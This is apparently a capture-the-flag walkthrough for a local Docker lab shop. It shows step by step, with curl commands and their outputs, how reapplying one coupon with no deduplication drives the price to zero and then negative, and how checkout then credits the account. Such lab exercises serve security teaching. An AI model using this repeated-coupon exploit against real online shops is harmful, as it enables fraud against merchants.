# Walkthrough: Business Logic Flaw

## Setup

```bash
docker compose up --build -d
```

## Step 1: Explore the Shop

```bash
CJAR=$(mktemp)
curl -s -c "$CJAR" -b "$CJAR" http://127.0.0.1:8095/cart
# {"price_cents":10000,"price_display":"$100.00","coupons_applied":[]}
```

## Step 2: Apply a Coupon Once

```bash
curl -s -c "$CJAR" -b "$CJAR" \
    -X POST http://127.0.0.1:8095/coupon/apply \
    -H "Content-Type: application/json" \
    -d '{"code":"FLAT5"}'
# {"price_display":"$95.00","coupons_applied":["FLAT5"]}
```

## Step 3: Apply the Same Coupon Again

```bash
curl -s -c "$CJAR" -b "$CJAR" \
    -X POST http://127.0.0.1:8095/coupon/apply \
    -H "Content-Type: application/json" \
    -d '{"code":"FLAT5"}'
# {"price_display":"$90.00","coupons_applied":["FLAT5","FLAT5"]}
```

The server accepted it. No deduplication.

## Step 4: Apply 18 More Times (20 Total = $0)

```bash
for i in $(seq 1 18); do
    curl -s -c "$CJAR" -b "$CJAR" \
        -X POST http://127.0.0.1:8095/coupon/apply \
        -H "Content-Type: application/json" \
        -d '{"code":"FLAT5"}' | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('price_display'))"
done
```

After 20 total applications: `$0.00`. The response on that request includes `flag1`.

## Step 5: Drive the Price Negative

Apply 5 more times:

```bash
for i in $(seq 1 5); do
    curl -s -c "$CJAR" -b "$CJAR" \
        -X POST http://127.0.0.1:8095/coupon/apply \
        -H "Content-Type: application/json" \
        -d '{"code":"FLAT5"}' | python3 -c "import json,sys; print(json.load(sys.stdin).get('price_display'))"
done
# -$5.00 ... -$25.00
```

## Step 6: Checkout with Negative Price

```bash
curl -s -c "$CJAR" -b "$CJAR" \
    -X POST http://127.0.0.1:8095/checkout \
    -H "Content-Type: application/json" -d '{}'
# {"paid_display":"-$25.00","balance_display":"$25.00","flag2":"POC{...}"}
```

The shop processed a -$25 charge, crediting $25 to the account. Flag 2 is in the response.

## Teardown

```bash
docker compose down
```
